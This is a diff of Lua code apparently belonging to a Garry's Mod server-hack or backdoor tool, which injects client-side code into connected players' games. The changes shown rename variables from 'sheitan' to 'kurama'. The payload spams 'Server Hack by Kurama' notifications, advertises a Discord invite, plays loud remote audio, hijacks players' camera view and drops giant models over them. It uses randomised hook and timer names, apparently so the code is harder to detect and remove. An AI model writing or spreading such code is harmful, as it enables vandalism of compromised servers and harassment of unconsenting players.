@@ -99,19 +99,15 @@ timer.Simple(5, function()
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
     notification.AddLegacy( "Server Hack by Kurama !", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
     notification.AddLegacy( "Server Hack by TheCedoux !", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
     notification.AddLegacy( "Server Backdoor is dead !", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
     notification.AddLegacy( "Sorry my Friends !", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
     notification.AddLegacy( "discord.gg/kurama", math.random(0, 4), 1.5 )
 end)
@@ -200,14 +196,12 @@ end
         sent = false
     end
 end
-
 sound.PlayURL("https://lesheitan.fr/songs/Water.mp3", "noblock", function(s)
     if not IsValid(s) then return end
         audio = s
     s:SetVolume( 15 )
     s:EnableLooping( false )
 end)
-
 hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
 hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
     return {
@@ -218,7 +212,6 @@ hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, or
     ["zfar"] = zfar
     }
 end)
-
 local function stop()
     audio = nil
     hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
@@ -229,7 +222,6 @@ local function stop()
         oldhooks[k] = nil
     end
 end
-
 concommand.Add("lelstop", stop)
     if s == 1 then 
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.2, 0, function()
@@ -283,29 +275,29 @@ end)
 timer.Simple(5, function()
 InfoClient([[
 timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
-local sheitan = ClientsideModel("models/player/dewobedil/danganronpa/monokuma.mdl")
-    sheitan:SetNoDraw(true)
-    sheitan:SetModelScale(50)
+local kurama = ClientsideModel("models/player/dewobedil/danganronpa/monokuma.mdl")
+    kurama:SetNoDraw(true)
+    kurama:SetModelScale(50)
 timer.Create("Model12", 0.01, 0, function()
-    sheitan:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
+    kurama:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
 end)
 local data = {}
-local function gensheitan(id)
+local function genkurama(id)
 local pos = LocalPlayer():GetPos()
     data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
 end
     for i=1, 50 do
-    gensheitan(i)
+    genkurama(i)
 end
     hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
 local z = LocalPlayer():GetPos().z
     for i=1, #data do
-        sheitan:SetPos(data[i][1])
-        sheitan:SetupBones()
-        sheitan:DrawModel()
+        kurama:SetPos(data[i][1])
+        kurama:SetupBones()
+        kurama:DrawModel()
         data[i][1].z = data[i][1].z - data[i][2] / 20
         if data[i][1].z <= z then
-        gensheitan(i)
+        genkurama(i)
     end
 end
     end)
